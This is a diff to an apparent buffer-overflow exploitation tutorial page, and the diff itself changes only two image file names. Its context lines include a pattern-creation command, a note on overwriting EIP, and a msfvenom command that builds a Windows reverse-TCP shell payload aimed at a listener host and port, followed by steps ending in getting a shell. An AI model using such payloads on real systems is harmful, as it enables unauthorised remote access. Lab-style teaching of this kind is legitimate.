@@ -78,7 +78,7 @@ msf-pattern_create -l 1000
 
 <mark style="color:yellow;">Access violation when executing \[76413176]</mark>
 
-<figure><img src="../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (34) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Notice that we are making an access violation occur on the EIP <mark style="color:yellow;">(76413176)</mark>
 
@@ -350,7 +350,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.6.111.208 LPORT=4444 EXITFUNC=thr
 4. Go back to your exploit and run it
 5. You should have a shell
 
-<figure><img src="../.gitbook/assets/image (1) (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
